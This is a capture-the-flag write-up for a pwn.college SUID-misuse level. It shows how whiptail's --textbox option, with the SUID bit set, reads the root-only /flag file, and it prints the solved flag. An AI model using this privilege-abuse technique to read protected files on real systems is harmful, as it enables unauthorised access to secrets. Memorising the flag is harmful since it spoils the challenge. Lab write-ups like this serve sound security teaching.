`whiptail` is a command-line based utility in Unix-like operating system that displays dialog boxes from shell scripts.

You can write this in your terminal,

`whiptail --title "Dialog Box" --msgbox "This is a message box" 10 20`

If you read the `man whiptail` you will find a `box option` called `--textbox file height width` which says:
`A text box lets you display the contents of a text file in a dialog box. It is like a simple text file viewer`.

```bash
hacker@program-misuse-level-33:~$ cd /
hacker@program-misuse-level-33:/$ cd challenge/
hacker@program-misuse-level-33:/challenge$ ls
babysuid_level33
hacker@program-misuse-level-33:/challenge$ ./babysuid_level33 
Welcome to ./babysuid_level33!

This challenge is part of a series of programs that
will require some light programming to read the flag..

I just set the SUID bit on /usr/bin/whiptail.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level33) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/whiptail!
hacker@program-misuse-level-33:/challenge$ 
hacker@program-misuse-level-33:/challenge$ cd /
hacker@program-misuse-level-33:/$ whiptail --textbox /flag 10 20
```

Then you will see a dialog box containing the flag.

> [!Flag]
> `pwn.college{U6pIkS8B6w7VJNKq0iBmeDv4b49.0VN3EDL0AjNzQzW}`

